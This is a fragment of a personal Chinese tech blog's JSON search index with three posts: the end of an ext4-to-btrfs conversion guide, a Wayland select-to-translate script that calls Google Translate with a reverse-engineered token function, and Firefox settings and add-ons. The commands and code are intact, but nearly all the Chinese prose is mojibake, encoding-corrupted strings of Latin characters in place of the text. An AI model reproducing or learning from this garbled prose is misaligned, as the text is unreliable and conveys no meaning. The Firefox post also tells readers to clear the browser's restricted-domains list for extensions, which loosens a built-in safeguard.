style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emount -t proc none /mnt/proc\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emount -t sysfs none /mnt/sys\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emount -o bind /dev /mnt/dev\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003echroot /mnt bash\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åæ‰§è¡Œä¸‹åˆ—å‘½ä»¤æ¥ä¸ºæ‰€æœ‰å†…æ ¸é‡å»ºå†…å­˜ç›˜\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003emkinitcpio -P\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæœ€åé‡å»ºgrubå¼•å¯¼, æŒ‰ç…§é“ç†åº”è¯¥è¦æŠŠå¼•å¯¼åˆ†åŒº\u003ccode\u003e/dev/nvme0n1p1\u003c/code\u003eæŒ‚è½½åˆ°\u003ccode\u003e/mnt/boot\u003c/code\u003eä¹‹åæ‰å¯ä»¥, ä½†æ˜¯æˆ‘è®°å¾—è‡ªå·±æ‰§è¡Œçš„æ—¶å€™æ²¡æœ‰æŒ‚è½½?\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egrub-mkconfig -o /boot/grub/grub.cfg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"é‡å»ºgrubå¼•å¯¼\"\u003eé‡å»ºgrubå¼•å¯¼\u003c/h3\u003e\n\u003cp\u003eåœ¨ä¸Šä¸€æ­¥çš„chrootç¯å¢ƒä¸­, æ‰§è¡Œä¸‹åˆ—å‘½ä»¤, è®°å¾—æŠŠå¼•å¯¼åˆ†åŒºæŒ‚è½½åˆ°\u003ccode\u003e/mnt/boot\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003egrub-mkconfig -o /boot/grub/grub.cfg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¤§åŠŸå‘Šæˆ, é€€å‡ºchroot, é‡å¯ç”µè„‘å°±å¯ä»¥è¿›å…¥ä½ çš„ç³»ç»Ÿäº†, å”¯ä¸€çš„ä¸åŒæ˜¯å®ƒå·²ç»æ˜¯btrfsäº†.\u003c/p\u003e","title":"ext4åˆ°btrfsè½¬æ¢è®°å½•"},{"content":"å¯¹äºæˆ‘è¿™ç§è‹±è¯­ä¸å¥½çš„äººæ¥è¯´, ç¿»è¯‘æ˜¯ç¦»ä¸å¼€çš„å·¥å…·, ä½†æ˜¯ä¼—æ‰€å‘¨çŸ¥, Linuxçš„æ—¥ç”¨è½¯ä»¶ç”Ÿæ€ç›¸æ¯”è¾ƒwindowså’Œmacosæ¥è¯´ç›¸å·®ç”šè¿œ, åˆ«è¯´ç›®å‰æ­£å¤„äºå‘å±•é˜¶æ®µçš„wayland, å°±è¿æˆç†Ÿé€äº†çš„x11ä¸‹ä¹Ÿæ²¡æœ‰æ‹¿å¾—å‡ºæ‰‹çš„ç¿»è¯‘è½¯ä»¶. ä½œä¸ºä¸€ä¸ªè‹±è¯­ä¸å¥½çš„Linuxçˆ±å¥½è€…, ç¼ºå°‘ç¿»è¯‘è½¯ä»¶å¿…å®šä¼šå¯¹æ—¥å¸¸çš„ä½¿ç”¨é€ æˆä¸€å®šçš„å½±å“, äºæ˜¯å¼€å§‹æ€è€ƒæ€ä¹ˆæ ·è§£å†³è¿™ä¸ªé—®é¢˜.\næˆ‘çš„ç¬¬ä¸€ä¸ªæ€è·¯, ä¹Ÿå°±æ˜¯è§åˆ°æœ€å¤šçš„åˆ’è¯ç¿»è¯‘è½¯ä»¶çš„æ ·å­, é€‰ä¸­æ–‡æœ¬ä¹‹å, åœ¨è¢«é€‰ä¸­çš„æ–‡æœ¬å‘¨å›´çš„æŸå—åŒºåŸŸä¸­ç»˜åˆ¶ä¸€ä¸ªçª—å£, åœ¨å…¶ä¸­å±•ç¤ºç¿»è¯‘ç»“æœ. ä½†æ˜¯é—®é¢˜æ¥äº†, è¦å¦‚ä½•ç»˜åˆ¶è¿™æ ·çš„çª—å£å‘¢? åœ¨waylandä¸­, çª—å£çš„ä½ç½®äº¤ç»™äº†compositorè¿›è¡Œç®¡ç†, è¿™ç§èƒ½å¤Ÿè‡ªå·±å†³å®šæ˜¾ç¤ºä½ç½®çš„èƒ½åŠ›, æ®æˆ‘æ‰€çŸ¥, åœ¨waylandä¸‹ä»…æœ‰fcitx5åšåˆ°äº†, äºæ˜¯æˆ‘ç¿»é˜…äº†ä¸€ä¸‹å®ƒçš„æºä»£ç , å¹¶æ²¡æœ‰çœ‹æ‡‚, ä½†æ˜¯åº”è¯¥æ²¡æœ‰å€ŸåŠ©äºQtå’ŒGTKæ¥ç»˜åˆ¶, è€Œæ˜¯ä½¿ç”¨wayland-client. å¯¹æˆ‘è¿™æ ·ä¸€ä¸ªè¿Qt GTKå¼€å‘ç»å†éƒ½æ²¡æœ‰çš„äººæ¥è¯´, ç†è§£waylandç¼–ç¨‹å¼€å‘ä¸­çš„é‚£äº›æ¦‚å¿µå®åœ¨æœ‰äº›å›°éš¾. äºæ˜¯ç´§æ¥ç€åˆæœ‰ä¸€ä¸ªé—®é¢˜å‡ºç°äº†:\nèƒ½å¦ç»•å¼€wayland?\nå°±æˆ‘æ€è€ƒè¿™ä¸ªé—®é¢˜çš„æ—¶å€™, linux QQç»™æˆ‘å‘äº†ä¸€ä¸ªç³»ç»Ÿé€šçŸ¥, æˆ‘çš„ç”µè„‘ä¸Šçš„ç³»ç»Ÿé€šçŸ¥æœåŠ¡åŸå…ˆåªæ˜¯ä¸ºäº†è®©linux qqä¸å´©æºƒæ‰å®‰è£…çš„, ç„¶è€Œè¿™ä¸ªæ—¶å€™, å®ƒç»™äº†æˆ‘ä¸€ä¸ªæ–°çš„è§£å†³æ–¹æ¡ˆ: ä½¿ç”¨ç³»ç»Ÿé€šçŸ¥æ¥å‘ˆç°ç¿»è¯‘ç»“æœ. äºæ˜¯æœäº†ä¸€ä¸‹å¦‚ä½•å‘é€ç³»ç»Ÿé€šçŸ¥, å‘ç°ç«Ÿç„¶æ„å¤–çš„ç®€å•.\nnotify-send \u0026#34;title\u0026#34; \u0026#34;content\u0026#34; é‚£ä¹ˆæ¥ä¸‹æ¥çš„é—®é¢˜: å¦‚ä½•è·å–é€‰ä¸­æ–‡æœ¬çš„å†…å®¹? è¿™ä¸ªé—®é¢˜, æˆ‘åŸæœ¬è®¡åˆ’é€šè¿‡é˜…è¯»wl-clipboardæ¥å­¦ä¹ çš„, ä½†æ˜¯æˆ‘æƒ³å…ˆå°½å¿«ç”¨ä¸Šç¿»è¯‘, æŠŠä¼˜åŒ–æ”¾åˆ°ä»¥åå†è¯´, äºæ˜¯å†³å®šç›´æ¥ä½¿ç”¨wl-clipboardæ¥è·å–é€‰ä¸­æ–‡æœ¬å†…å®¹, é‚£ä¹ˆè‡³æ­¤æ€è·¯ç†æ¸…, å¤§è‡´å¦‚ä¸‹:\nä½¿ç”¨å‰ªåˆ‡æ¿è·å–åˆ°é€‰ä¸­æ–‡æœ¬çš„å†…å®¹, å¯ä»¥ä½¿ç”¨wl-paste -pæ¥è·å– è·å–æ–‡æœ¬ä¹‹å, å°†æ¢è¡Œç¬¦æ›¿æ¢æˆç©ºæ ¼ (è¿™å—å¯ä»¥æœ‰æ›´å¥½çš„å¤„ç†æ–¹æ³•, ç®€å•èµ·è§å°±å…¨æ¢æ‰äº†), ä½¿ç”¨sed æ–‡æœ¬å¤„ç†å®Œæ¯•å, å°†æ–‡æœ¬è¾“å…¥è¿›translate.jsä¸­è¿›è¡Œç¿»è¯‘, (è¿™å—å¯ä»¥ä½¿ç”¨åˆ«çš„ç°æˆå·¥å…·) ç¿»è¯‘ç»“æœå‡ºæ¥ä¹‹å, å°†ç»“æœä»¥ç³»ç»Ÿé€šçŸ¥çš„å½¢å¼å‘ˆç°å‡ºæ¥, å½“ç„¶, ç³»ç»Ÿé€šçŸ¥å¿…é¡»è¦æœ‰, å¯ä»¥æ˜¯dunst, mako, swaync, ä»¥åŠkdeæˆ–è€…gnomeçš„æ¡Œé¢æ¶ˆæ¯é€šçŸ¥éƒ½å¯ä»¥. å‘é€ç¿»è¯‘ç»“æœä½¿ç”¨å‘½ä»¤notify-send \u0026quot;æ ‡é¢˜\u0026quot; \u0026quot;ç¿»è¯‘å†…å®¹\u0026quot; ä»¥æˆ‘çš„åˆ’è¯ç¿»è¯‘ä¸ºæ¡ˆä¾‹, æˆ‘åœ¨~/.config/sway/configä¸­åŠ å…¥äº†è¿™ä¹ˆä¸€è¡Œä½œä¸ºåˆ’è¯ç¿»è¯‘è§¦å‘æŒ‰é”®\nbindsym Ctrl+Mod1+z exec ~/.config/sway/bin/translate.sh é‚£ä¹ˆæ¥çœ‹çœ‹translate.shçš„å†…å®¹æ˜¯æ€ä¹ˆæ ·çš„:\na=$(wl-paste -p | sed \u0026#39;:a;N;$!ba;s/\\n/ /g\u0026#39; | node ~/.config/sway/bin/translate.js) notify-send \u0026#34;Google\u0026#34; \u0026#34;$a\u0026#34; é¦–å…ˆä»primaryå‰ªåˆ‡æ¿ä¸­è·å–é€‰ä¸­çš„æ–‡æœ¬å†…å®¹, æ³¨æ„è¿™ä¸ªå‰ªåˆ‡æ¿ä¸éœ€è¦ä½ æŒ‰ctrl-c, é€‰ä¸­æ–‡æœ¬çš„æ—¶å€™, æ–‡æœ¬ä¼šè‡ªåŠ¨å‡ºç°åœ¨primaryå‰ªåˆ‡æ¿ä¸­. ç„¶åä½¿ç”¨sedå‘½ä»¤å°†\\néƒ½æ›¿æ¢ä¸ºç©ºæ ¼. å†ç„¶åæ‰§è¡Œjsè„šæœ¬, å°†è¦ç¿»è¯‘çš„å†…å®¹é€šè¿‡ç®¡é“ç¬¦è¾“å…¥è¿›å», jsè„šæœ¬è°ƒç”¨è°·æ­Œç¿»è¯‘. æœ€åå‡ºæ¥çš„ç¿»è¯‘ç»“æœé€šè¿‡notify-sendå‘é€å‡ºå»äº†.\ntranslate.jsæ–‡ä»¶çš„å†…å®¹å¦‚ä¸‹\nfunction TL(a) { var k = \u0026#34;\u0026#34;; var b = 406644; var b1 = 3293161072; var jd = \u0026#34;.\u0026#34;; var $b = \u0026#34;+-a^+6\u0026#34;; var Zb = \u0026#34;+-3^+b+-f\u0026#34;; for (var e = [], f = 0, g = 0; g \u0026lt; a.length; g++) { var m = a.charCodeAt(g); 128 \u0026gt; m ? (e[f++] = m) : (2048 \u0026gt; m ? (e[f++] = (m \u0026gt;\u0026gt; 6) | 192) : (55296 === (m \u0026amp; 64512) \u0026amp;\u0026amp; g + 1 \u0026lt; a.length \u0026amp;\u0026amp; 56320 === (a.charCodeAt(g + 1) \u0026amp; 64512) ? ((m = 65536 + ((m \u0026amp; 1023) \u0026lt;\u0026lt; 10) + (a.charCodeAt(++g) \u0026amp; 1023)), (e[f++] = (m \u0026gt;\u0026gt; 18) | 240), (e[f++] = ((m \u0026gt;\u0026gt; 12) \u0026amp; 63) | 128)) : (e[f++] = (m \u0026gt;\u0026gt; 12) | 224), (e[f++] = ((m \u0026gt;\u0026gt; 6) \u0026amp; 63) | 128)), (e[f++] = (m \u0026amp; 63) | 128)); } a = b; for (f = 0; f \u0026lt; e.length; f++) (a += e[f]), (a = RL(a, $b)); a = RL(a, Zb); a ^= b1 || 0; 0 \u0026gt; a \u0026amp;\u0026amp; (a = (a \u0026amp; 2147483647) + 2147483648); a %= 1e6; return a.toString() + jd + (a ^ b); } function RL(a, b) { var t = \u0026#34;a\u0026#34;; var Yb = \u0026#34;+\u0026#34;; for (var c = 0; c \u0026lt; b.length - 2; c += 3) { var d = b.charAt(c + 2); d = d \u0026gt;= t ? d.charCodeAt(0) - 87 : Number(d); d = b.charAt(c + 1) === Yb ? a \u0026gt;\u0026gt;\u0026gt; d : a \u0026lt;\u0026lt; d; a = b.charAt(c) === Yb ? (a + d) \u0026amp; 4294967295 : a ^ d; } return a; } const http = require(\u0026#34;http\u0026#34;); const readline = require(\u0026#34;readline\u0026#34;); const rl = readline.createInterface({ input: process.stdin, output: process.stdout, }); rl.question(\u0026#34;\u0026#34;, function (text) { var strip_text = text.replace(/\\n/g, \u0026#34;\u0026#34;); var target_language = \u0026#34;zh-CN\u0026#34;; const options = { hostname: \u0026#34;translate.google.com\u0026#34;, path: `/translate_a/single?client=webapp\u0026amp;sl=auto\u0026amp;tl=${target_language}\u0026amp;hl=${target_language}\u0026amp;dt=at\u0026amp;dt=bd\u0026amp;dt=ex\u0026amp;dt=ld\u0026amp;dt=md\u0026amp;dt=qca\u0026amp;dt=rw\u0026amp;dt=rm\u0026amp;dt=ss\u0026amp;dt=t\u0026amp;source=bh\u0026amp;ssel=0\u0026amp;tsel=0\u0026amp;kc=1\u0026amp;tk=${TL( strip_text, )}\u0026amp;q=${encodeURIComponent(strip_text)}`, method: \u0026#34;GET\u0026#34;, headers: { responseType: \u0026#34;json\u0026#34; }, }; const req = http .request(options, (res) =\u0026gt; { let data = \u0026#34;\u0026#34;; res.on(\u0026#34;data\u0026#34;, (chunk) =\u0026gt; { data += chunk; }); // Ending the response res.on(\u0026#34;end\u0026#34;, () =\u0026gt; { var result = JSON.parse(data); var content_list = result[0]; var final = \u0026#34;\u0026#34;; // console.log(content_list) for (let index = 0; index \u0026lt; content_list.length; index++) { if (content_list[index][0] !== null) { final += content_list[index][0]; } else { break; } } console.log(final); }); }) .on(\u0026#34;error\u0026#34;, (err) =\u0026gt; { console.log(\u0026#34;Error: \u0026#34;, err); }) .end(); }); ","permalink":"https://dragonbox.top/posts/tech-translation-under-wayland/","summary":"\u003cp\u003eå¯¹äºæˆ‘è¿™ç§è‹±è¯­ä¸å¥½çš„äººæ¥è¯´, ç¿»è¯‘æ˜¯ç¦»ä¸å¼€çš„å·¥å…·, ä½†æ˜¯ä¼—æ‰€å‘¨çŸ¥, Linuxçš„æ—¥ç”¨è½¯ä»¶ç”Ÿæ€ç›¸æ¯”è¾ƒwindowså’Œmacosæ¥è¯´ç›¸å·®ç”šè¿œ, åˆ«è¯´ç›®å‰æ­£å¤„äºå‘å±•é˜¶æ®µçš„wayland, å°±è¿æˆç†Ÿé€äº†çš„x11ä¸‹ä¹Ÿæ²¡æœ‰æ‹¿å¾—å‡ºæ‰‹çš„ç¿»è¯‘è½¯ä»¶. ä½œä¸ºä¸€ä¸ªè‹±è¯­ä¸å¥½çš„Linuxçˆ±å¥½è€…, ç¼ºå°‘ç¿»è¯‘è½¯ä»¶å¿…å®šä¼šå¯¹æ—¥å¸¸çš„ä½¿ç”¨é€ æˆä¸€å®šçš„å½±å“, äºæ˜¯å¼€å§‹æ€è€ƒæ€ä¹ˆæ ·è§£å†³è¿™ä¸ªé—®é¢˜.\u003c/p\u003e\n\u003cp\u003eæˆ‘çš„ç¬¬ä¸€ä¸ªæ€è·¯, ä¹Ÿå°±æ˜¯è§åˆ°æœ€å¤šçš„åˆ’è¯ç¿»è¯‘è½¯ä»¶çš„æ ·å­, é€‰ä¸­æ–‡æœ¬ä¹‹å, åœ¨è¢«é€‰ä¸­çš„æ–‡æœ¬å‘¨å›´çš„æŸå—åŒºåŸŸä¸­ç»˜åˆ¶ä¸€ä¸ªçª—å£, åœ¨å…¶ä¸­å±•ç¤ºç¿»è¯‘ç»“æœ. ä½†æ˜¯é—®é¢˜æ¥äº†, è¦å¦‚ä½•ç»˜åˆ¶è¿™æ ·çš„çª—å£å‘¢? åœ¨waylandä¸­, çª—å£çš„ä½ç½®äº¤ç»™äº†compositorè¿›è¡Œç®¡ç†, è¿™ç§èƒ½å¤Ÿè‡ªå·±å†³å®šæ˜¾ç¤ºä½ç½®çš„èƒ½åŠ›, æ®æˆ‘æ‰€çŸ¥, åœ¨waylandä¸‹ä»…æœ‰fcitx5åšåˆ°äº†, äºæ˜¯æˆ‘ç¿»é˜…äº†ä¸€ä¸‹å®ƒçš„æºä»£ç , å¹¶æ²¡æœ‰çœ‹æ‡‚, ä½†æ˜¯åº”è¯¥æ²¡æœ‰å€ŸåŠ©äºQtå’ŒGTKæ¥ç»˜åˆ¶, è€Œæ˜¯ä½¿ç”¨wayland-client. å¯¹æˆ‘è¿™æ ·ä¸€ä¸ªè¿Qt GTKå¼€å‘ç»å†éƒ½æ²¡æœ‰çš„äººæ¥è¯´, ç†è§£waylandç¼–ç¨‹å¼€å‘ä¸­çš„é‚£äº›æ¦‚å¿µå®åœ¨æœ‰äº›å›°éš¾. äºæ˜¯ç´§æ¥ç€åˆæœ‰ä¸€ä¸ªé—®é¢˜å‡ºç°äº†:\u003c/p\u003e\n\u003cp\u003eèƒ½å¦ç»•å¼€wayland?\u003c/p\u003e\n\u003cp\u003eå°±æˆ‘æ€è€ƒè¿™ä¸ªé—®é¢˜çš„æ—¶å€™, linux QQç»™æˆ‘å‘äº†ä¸€ä¸ªç³»ç»Ÿé€šçŸ¥, æˆ‘çš„ç”µè„‘ä¸Šçš„ç³»ç»Ÿé€šçŸ¥æœåŠ¡åŸå…ˆåªæ˜¯ä¸ºäº†è®©linux qqä¸å´©æºƒæ‰å®‰è£…çš„, ç„¶è€Œè¿™ä¸ªæ—¶å€™, å®ƒç»™äº†æˆ‘ä¸€ä¸ªæ–°çš„è§£å†³æ–¹æ¡ˆ: ä½¿ç”¨ç³»ç»Ÿé€šçŸ¥æ¥å‘ˆç°ç¿»è¯‘ç»“æœ. äºæ˜¯æœäº†ä¸€ä¸‹å¦‚ä½•å‘é€ç³»ç»Ÿé€šçŸ¥, å‘ç°ç«Ÿç„¶æ„å¤–çš„ç®€å•.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003enotify-send \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;title\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;content\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eé‚£ä¹ˆæ¥ä¸‹æ¥çš„é—®é¢˜: å¦‚ä½•è·å–é€‰ä¸­æ–‡æœ¬çš„å†…å®¹? è¿™ä¸ªé—®é¢˜, æˆ‘åŸæœ¬è®¡åˆ’é€šè¿‡é˜…è¯»\u003ccode\u003ewl-clipboard\u003c/code\u003eæ¥å­¦ä¹ çš„, ä½†æ˜¯æˆ‘æƒ³å…ˆå°½å¿«ç”¨ä¸Šç¿»è¯‘, æŠŠä¼˜åŒ–æ”¾åˆ°ä»¥åå†è¯´, äºæ˜¯å†³å®šç›´æ¥ä½¿ç”¨\u003ccode\u003ewl-clipboard\u003c/code\u003eæ¥è·å–é€‰ä¸­æ–‡æœ¬å†…å®¹, é‚£ä¹ˆè‡³æ­¤æ€è·¯ç†æ¸…, å¤§è‡´å¦‚ä¸‹:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eä½¿ç”¨å‰ªåˆ‡æ¿è·å–åˆ°é€‰ä¸­æ–‡æœ¬çš„å†…å®¹, å¯ä»¥ä½¿ç”¨\u003ccode\u003ewl-paste -p\u003c/code\u003eæ¥è·å–\u003c/li\u003e\n\u003cli\u003eè·å–æ–‡æœ¬ä¹‹å, å°†æ¢è¡Œç¬¦æ›¿æ¢æˆç©ºæ ¼ (è¿™å—å¯ä»¥æœ‰æ›´å¥½çš„å¤„ç†æ–¹æ³•, ç®€å•èµ·è§å°±å…¨æ¢æ‰äº†), ä½¿ç”¨\u003ccode\u003esed\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eæ–‡æœ¬å¤„ç†å®Œæ¯•å, å°†æ–‡æœ¬è¾“å…¥è¿›\u003ccode\u003etranslate.js\u003c/code\u003eä¸­è¿›è¡Œç¿»è¯‘, (è¿™å—å¯ä»¥ä½¿ç”¨åˆ«çš„ç°æˆå·¥å…·)\u003c/li\u003e\n\u003cli\u003eç¿»è¯‘ç»“æœå‡ºæ¥ä¹‹å, å°†ç»“æœä»¥ç³»ç»Ÿé€šçŸ¥çš„å½¢å¼å‘ˆç°å‡ºæ¥, å½“ç„¶, ç³»ç»Ÿé€šçŸ¥å¿…é¡»è¦æœ‰, å¯ä»¥æ˜¯\u003ccode\u003edunst\u003c/code\u003e, \u003ccode\u003emako\u003c/code\u003e, \u003ccode\u003eswaync\u003c/code\u003e, ä»¥åŠkdeæˆ–è€…gnomeçš„æ¡Œé¢æ¶ˆæ¯é€šçŸ¥éƒ½å¯ä»¥. å‘é€ç¿»è¯‘ç»“æœä½¿ç”¨å‘½ä»¤\u003ccode\u003enotify-send \u0026quot;æ ‡é¢˜\u0026quot; \u0026quot;ç¿»è¯‘å†…å®¹\u0026quot;\u003c/code\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eä»¥æˆ‘çš„åˆ’è¯ç¿»è¯‘ä¸ºæ¡ˆä¾‹,  æˆ‘åœ¨\u003ccode\u003e~/.config/sway/config\u003c/code\u003eä¸­åŠ å…¥äº†è¿™ä¹ˆä¸€è¡Œä½œä¸ºåˆ’è¯ç¿»è¯‘è§¦å‘æŒ‰é”®\u003c/p\u003e","title":"waylandä¸‹çš„åˆ’è¯ç¿»è¯‘è§£å†³æ–¹æ¡ˆ"},{"content":"ä¸ç®¡ç«ç‹çš„å¸‚åœºä»½é¢å¤šä¹ˆæ‹‰èƒ¯, å¯¹äºLinux waylandç”¨æˆ·æ¥è¯´, ç›®å‰ä½“éªŒæœ€å¥½çš„æµè§ˆå™¨ä¾æ—§æ˜¯Firefox. æœ¬ç¯‡è®°å½•æˆ‘çš„FIrefoxé…ç½®, åŒ…æ‹¬æµè§ˆå™¨è®¾ç½®å’Œæ’ä»¶è®¾ç½®.\nå¤–è§‚ titlebar ä¸ºäº†è®©æ ‡é¢˜æ ä¸­çš„å†…å®¹å¯ä»¥æ›´åŠ ç´§å‡‘, ä¸€ä¸ªå¥½åŠæ³•æ˜¯è¿›å…¥about:config, è®¾ç½®browser.compactmode.showä¸ºtrue, ç„¶åè¿›å…¥custom toolbar, è®¾ç½®Densityä¸ºCompact\nå¯¹äºwmç”¨æˆ·, ä¸€ä¸ªæ¨èçš„è®¾ç½®æ˜¯å‹¾é€‰ä¸Šä¸Šå›¾ä¸­çš„Title Baré€‰é¡¹, ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆè®¾ç½®å‘¢, å› ä¸ºè¿™æ ·å­åš, é‚£äº›æŒ‰é’®(æœ€å¤§æœ€å°åŒ–, å…³é—­çª—å£)å°±ä¼šå‡ºç°åˆ°title barä¸­, ç„¶åtitle barä¼šè¢«wmåƒæ‰, è¿™æ ·å°±å¯ä»¥ç»™ç«ç‹çš„æ ‡é¢˜æ ç•™å‡ºæ›´å¤šçš„ç©ºé—´\nps: æˆ‘ç”¨çš„ä¸»é¢˜åå­—å«åštokyonight\nFirefox-UI-Fix ä½¿ç”¨Firefox-UI-Fixæ¥ä¸ªæ€§åŒ–Firefoxçš„ç•Œé¢\nAddon Vimium è¯¥æ’ä»¶å°†vimçš„æ“ä½œæ–¹å¼å¸¦å…¥åˆ°æµè§ˆå™¨ä¸­, èƒ½å¤Ÿè®©ç”¨æˆ·æ›´å°‘ä¾èµ–é¼ æ ‡.\né»˜è®¤æƒ…å†µä¸‹, firefoxå‡ºäºå®‰å…¨è€ƒè™‘ä¼šåœ¨ä¸€äº›é¡µé¢ä¸­ç¦ç”¨Addon, ä¸ºäº†è®©è¯¥æ’ä»¶èƒ½å¤Ÿåœ¨æ›´å¤šçš„é¡µé¢ä¸Šä½¿ç”¨, éœ€è¦åœ¨about:configä¸­è¿›è¡Œä»¥ä¸‹è®¾ç½®\nextensions.webextensions.restrictedDomainsæ¸…ç©ºæ‰ privacy.resistFingerprinting.block_mozAddonManagerè®¾ç½®ä¸ºtrue,æ¥è®©æ’ä»¶åœ¨æ‰€æœ‰é¡µé¢ä¸Šéƒ½å¯ä»¥ä½¿ç”¨ ä»¥ä¸‹æ˜¯æˆ‘çš„Vimiumé”®ä½è®¾ç½®.\n# Insert your preferred key mappings here. unmapAll map H previousTab map J previousTab map L nextTab map K nextTab map \u0026lt;c-j\u0026gt; scrollPageDown map \u0026lt;c-k\u0026gt; scrollPageUp map \u0026lt;c-o\u0026gt; goBack map \u0026lt;c-i\u0026gt; goForward map o Vomnibar.activateInNewTab map b Vomnibar.activateBookmarksInNewTab map t Vomnibar.activateTabSelection map M LinkHints.activateModeToOpenInNewTab map m LinkHints.activateModeToOpenInNewForegroundTab map gi focusInput map gg scrollToTop map G scrollToBottom map j scrollDown map k scrollUp map h scrollLeft map l scrollRight map x removeTab map X restoreTab map ? showHelp map yy copyCurrentUrl map p openCopiedUrlInNewTab Tip: å¦‚æœåœ¨æŸæ¬¡æ›´æ–°ä¹‹åå‘ç°æ’ä»¶ä¸å¯ç”¨äº†, é‚£ä¹ˆå¯ä»¥è€ƒè™‘ä¸´æ—¶åˆ‡æ¢åˆ°å¦ä¸€ä¸ªç±»ä¼¼çš„æ’ä»¶ Vimium C , æŠŠç›¸åŒçš„é”®ä½å¤åˆ¶è¿›å»å°±è¡Œå•¦.\nç„¶å, è™½ç„¶æˆ‘ä¸ç»å¸¸ç”¨, ä½†æ˜¯vomnibaræ˜¯ä¸ªå¥½ä¸œè¥¿, æŒ‰ä¸€ä¸ªé”®å³å¯å‘¼å‡º, åœ¨å…¶ä¸­æœç´¢tab, ä¹¦ç­¾, å†å²è®°å½•, ä»¥åŠè°ƒç”¨æœç´¢å¼•æ“,å¯æƒœé»˜è®¤ä¸»é¢˜æœ‰ç‚¹ä¸‘, å¯ä»¥å»githubä¸Šæ‰¾ä¸€äº›ä¸»é¢˜, æˆ‘ä¸ªäººç”¨çš„æ˜¯ https://github.com/catppuccin/vimium\nTampermonkey å¸¸ç”¨çš„è„šæœ¬ä¸å¤š, æœ‰ https://github.com/the1812/Bilibili-Evolved å’Œhttps://github.com/wandou-cc/blog-ui\nChecker Plus for Gmail è¿›å…¥Option, æ·»åŠ è´¦å·å¹¶ä¸”è®¾ç½®ä¸ºstay signed in, å°±å¯ä»¥æ–¹ä¾¿ç®¡ç†å¤šä¸ªgmailé‚®ç®±äº†.\nå…¶ä»– Zotero Connector : æœé›†æ–‡çŒ®çš„æ—¶å€™ç”¨çš„ Cookie-Editor : ç¼–è¾‘Cookie Dark Reader : å…¨éƒ¨é¡µé¢åŒ–ä¸ºæš—è‰²æ¨¡å¼ Google Scholar Button : è°·æ­Œå­¦æœ¯æŸ¥è¯¢, å¯ä»¥æ–¹ä¾¿æŸ¥æ–‡çŒ® Octotree : åœ¨githubä»“åº“ç½‘é¡µä¸Šåˆ—å‡ºæ–‡ä»¶æ ‘, æ–¹ä¾¿ä¸´æ—¶æŸ¥é˜…ä»£ç  TWP : è°·æ­Œç¿»è¯‘æ’ä»¶ uBlock Origin : å› ä¸ºæ•ˆæœå¤ªå¥½è¢«chromeä¸‹æ¶äº†ä¸€é˜µå­çš„å¹¿å‘Šæ‹¦æˆªæ’ä»¶ Adblocker for youtube: è·³è¿‡youtubeçš„å¹¿å‘Š è§†é¢‘ç¡¬ä»¶è§£ç  å‚è€ƒArchwiki\ngfx.webrender.all = true gfx.webrender.enabled = true media.ffmpeg.vaapi.enabled = true media.ffvpx.enabled = false media.navigator.mediadatadecoder_vpx_enabled = true media.rdd-vpx.enabled = false ç”±äºvainfoæ˜¾ç¤ºæˆ‘çš„æ˜¾å¡ä¸æ”¯æŒav1è§£ç ,æ‰€ä»¥ç¦ç”¨av1æ¯”è¾ƒå¥½\nmedia.av1.enabled = false è‡³äºvdpau, ç”±äºåªæœ‰nvidiaæ‰å¯ä»¥ç”¨, æˆ‘æ²¡æœ‰nå¡, æ‰€ä»¥ä¸éœ€è¦å®‰è£….\næœ€åå¯ä»¥ä½¿ç”¨nvtopæ¥æŸ¥çœ‹è§†é¢‘ç¡¬è§£æ˜¯å¦æ­£å¸¸å·¥ä½œ, å¦‚æœå‡ºç°DECå­—æ ·è¯´æ˜æ­£å¸¸.\næœ€å æˆ‘å¹¶ä¸æ˜¯ä¸€ä¸ªMozillaå¹, æ°æ°ç›¸å, 